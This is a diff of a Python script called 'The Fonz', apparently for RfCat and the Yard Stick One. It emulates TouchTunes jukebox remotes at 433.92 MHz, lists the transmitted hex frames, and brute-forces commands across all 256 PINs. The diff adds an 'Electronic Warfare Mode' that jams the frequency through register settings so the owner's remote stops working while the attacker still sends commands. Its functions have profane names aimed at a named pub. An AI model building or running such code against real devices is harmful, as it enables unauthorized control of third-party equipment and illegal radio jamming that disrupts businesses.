@@ -1,29 +1,32 @@
 #!/usr/bin/python
-#
-#The Fonz, a friendly TouchTunes Remote imulation tool used for finding PIN's, brute forcing, and genural jukebox control.
-#TouchTunes remotes TX at 433.92Mhz, uses ASK/OOK and uses a pin (000-255) for "security". 
-#This script was meant to be used with RfCat and the Yard Stick One.
 
-#Here's an example of what the transmission looks like (in hex), on/off button with the PIN 000 
-#==Preamble==  ==Key==  ==Message== ==?==
-#ffff00a2888a2   aaaa   8888aa2aa22  20
+'''
+The Fonz, a friendly TouchTunes Remote emulation tool used for finding PIN's, brute forcing commands,
+jamming unwanted signals and general jukebox control.
+TouchTunes remotes TX at 433.92Mhz, uses ASK/OOK and uses a PIN (000-255) for addressing. 
+This script was meant to be used with RfCat and the Yard Stick One.
 
-#And the on/off button with PIN 255
-#==Preamble==  ==Key==  ==Message== ==?==
-#ffff00a2888a2 22222222 8888aa2aa22  20
+Here's an example of what the transmission looks like (in hex), on/off button with the PIN 000 
+==Preamble==  ==Key==  ==Message== ==?==
+ffff00a2888a2   aaaa   8888aa2aa22  20
 
-#The message sometimes changes with the key but the key will be same regardless of the button pressed.  
-#Here's an example of the on/off button with the pin 001
-#==Preamble==  ==Key==  ==Message== ==?==
-#ffff00a2888a2  2aaa    a2222a8aa88   88
+And the on/off button with PIN 255
+==Preamble==  ==Key==  ==Message== ==?==
+ffff00a2888a2 22222222 8888aa2aa22  20
+
+The message sometimes changes with the key but the key will be same regardless of the button pressed.  
+Here's an example of the on/off button with the pin 001
+==Preamble==  ==Key==  ==Message== ==?==
+ffff00a2888a2  2aaa    a2222a8aa88   88
 
 
-#Based off of Michael Osman's code. https://greatscottgadgets.com/
-#rflib and vstruct pulled from https://github.com/ecc1/rfcat
-#Written by NotPike, notpike@horsefucker.org
-
+Based off of Michael Osman's code. https://greatscottgadgets.com/
+rflib and vstruct pulled from https://github.com/ecc1/rfcat
+Written by NotPike, notpike@horsefucker.org
+'''
 
 from rflib import *
+from termcolor import colored
 import datetime
 import time
 import sys
@@ -34,12 +37,13 @@ banner = """    _____ _            _____
    |_   _| |__   ___  |  ___|__  _ __  ____
      | | | '_ \ / _ \ | |_ / _ \| '_ \|_  /
      | | | | | |  __/ |  _| (_) | | | |/ / 
-     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.7
+     |_| |_| |_|\___| |_|  \___/|_| |_/___| V0.8
 
 "Arthur, it's morning, have you been here all night?"
-              Slect a number to begin!\n"""
+              Slect a number to begin!"""
 
-
+#Variables
+ewMode = False
 
 #Values(keys) for each PIN, in order (000-255) when they are transited.
 #ex. nukecode[0] ==  PIN 000, nukecode[50] == PIN 050, and nukecode[255] == PIN 255   
@@ -162,6 +166,10 @@ def CommandFind(pkt):
 
 #Sets modes for the Yard Stick One and prints results
 def Scan(d):
+        global ewMode
+        ewMode = False
+        unFuckMadisonPub()#Kills EW Mode
+        d.setModeRX()
         d.setFreq(433.92e6)
         d.setMdmModulation(MOD_ASK_OOK)
         d.setMdmDRate(1766)
@@ -190,6 +198,9 @@ def Scan(d):
 
 
 def TX(data, repeat=0):
+        if ewMode == True:
+                unFuckMadisonPub()
+                        
         d.setFreq(433.92e6)
         d.setMdmModulation(MOD_ASK_OOK)
         d.setMdmDRate(1766)
@@ -198,12 +209,13 @@ def TX(data, repeat=0):
         d.setMdmSyncWord(0)
         d.setMaxPower()
         d.RFxmit(data, repeat)
-        print '<*> TX'
+
+        if ewMode == True:
+                fuckYouMadisonPub()
 
 
 #Trys every PIN for a command
 def BruteForceThisMotherFucker(CommandZero,CommandOne):
-
                         os.system('clear')
                         print "\n\"What day is today?\" asked Pooh"
                         time.sleep(1)
@@ -226,9 +238,7 @@ def BruteForceThisMotherFucker(CommandZero,CommandOne):
                                         FullCommand += '0'
                                 
                                 if len(GroupCommand) <= 255-len(FullCommand): #how many hex ch in 8bit
-                                        #print FullCommand
                                         GroupCommand += FullCommand
-                                        #print len(GroupCommand)
                                         PinCounter +=1
 
                                 else:
@@ -243,20 +253,81 @@ def BruteForceThisMotherFucker(CommandZero,CommandOne):
                         TotalTime = stop-start
                         print "<*> BRUTE FORCE COMPLETE! TIME: %isec\n" %(TotalTime)
                         loop2 = False
+                        time.sleep(2)
                         MainMenu()
                         
+def fuckYouMadisonPub():
+        d.setModeIDLE()
+        d.setMaxPower()
+        d.setRFRegister(PA_TABLE0, 0xFF) #PA_TABLE 0 and 1 has to do with the CC1111 OOK
+        d.setRFRegister(PA_TABLE1, 0XFF) #0xFF tx's constantly
+        d.setFreq(433.92e6)
+        d.setModeTX()
+        print "<*> Jamming at 433.92 MHz"
+
+def unFuckMadisonPub():
+        d.setModeIDLE()
+        d.setRFRegister(PA_TABLE0, 0x00)
+        d.setRFRegister(PA_TABLE1, 0x00)
+
+def ewMenu():
+        global ewMode
+        loop = True
+        while loop:
+                try:
+                        if ewMode == False:
+                                print "\n<*> Electronic Warfare Mode will JAM the receiver while still"
+                                print "    allowing you to send commands to the Juke Box."
+                                print "<*> This mode stops when you 'Scan'."
+                                ewAns = raw_input("Start EW Mode? [Y/N]: ")
+                                if str.lower(ewAns) == 'n':
+                                        loop = False
+                                        MainMenu()
+                                elif str.lower(ewAns) == 'y':
+                                        loop = False
+                                        ewMode = True
+                                        fuckYouMadisonPub()
+                                        MainMenu()
+                                else:
+                                        print "Not a valid choice, please try again... \n"
+                                        time.sleep(.5)
+                        else:
+                                ewAns = raw_input("Stop EW Mode? [Y/N]: ")
+                                if str.lower(ewAns) == 'n':
+                                        loop = False
+                                        MainMenu()
+                                elif str.lower(ewAns) == 'y':
+                                        loop = False
+                                        ewMode = False
+                                        unFuckMadisonPub()
+                                        MainMenu()
+                                else:
+                                        print "Not a valid choice, please try again... \n"
+                                        time.sleep(.5)
+                except ValueError:
+                        print "Not a valid choice, please try again... \n"
+                        time.sleep(.5)
+                        pass
 
 def MainMenu():
-        mainmenu = ''' -=Main Menu=-
+        if ewMode == True:
+                mode = colored("ON", 'red')
+        else:
+                mode = colored("OFF", 'green')
+        
+        os.system('clear')
+        print(banner)
+        mainmenu = '''\n -=Main Menu=-
 1.) Scan
 2.) TX
-3.) Exit \n'''
+3.) Eletronic Warfare Mode (%s)
+4.) Exit \n'''%(mode)
 
         print mainmenu        
         loop = True
         while loop:
                 try:
-                        MenuAns=raw_input('Select [1-3]: ')
+                        MenuAns=raw_input('Select [1-4]: ')
                         if int(MenuAns) == 1:
                                 loop = False                                
                                 Scan(d)
@@ -264,6 +335,10 @@ def MainMenu():
                                 loop = False
                                 TxMenu()
                         elif int(MenuAns) == 3:
+                                loop = False
+                                ewMenu()
+                        elif int(MenuAns) == 4:
+                                unFuckMadisonPub()
                                 sys.exit()
                         else: 
                                 print "Not a valid choice, please try again... \n"
@@ -273,7 +348,6 @@ def MainMenu():
                         print "Not a valid choice, please try again... \n"
                         time.sleep(.5)
                         pass
-
 
 #makes a reveresed list of commands and refrences it to the user's choice
 def TxMenu():
@@ -311,9 +385,8 @@ def TxMenu():
                                         MainMenu()
                 else:
                         print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        unFuckMadisonPub()   
                         sys.exit()
-
-
 
 def PinMenu():
         loop = True
@@ -335,7 +408,6 @@ def PinMenu():
                         print "Not a valid choice, please try again... \n"
                         time.sleep(.5)
                         pass
-
 
 def CommandMenu():
         global KeyButton
@@ -367,8 +439,6 @@ def CommandMenu():
                         time.sleep(.5)
                         pass
         
-
-
 def TimesMenu():
         loop = True
         while loop:
@@ -387,9 +457,7 @@ def TimesMenu():
                         time.sleep(.5)
                         pass        
 
-
 def BruteMenu():
-       
         items = commands.keys()
         items.sort(reverse=1) #anti-alphabetical order
         choice = 0
@@ -429,13 +497,10 @@ def BruteMenu():
                         BruteForceThisMotherFucker(CommandZero,CommandOne)
                 else:
                         print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        unFuckMadisonPub()
                         sys.exit()
 
 
 if __name__ == '__main__':
-        d = RfCat()
-        os.system('clear')
-        print(banner)
+        d = RfCat(idx=0)
         MainMenu()
-
-
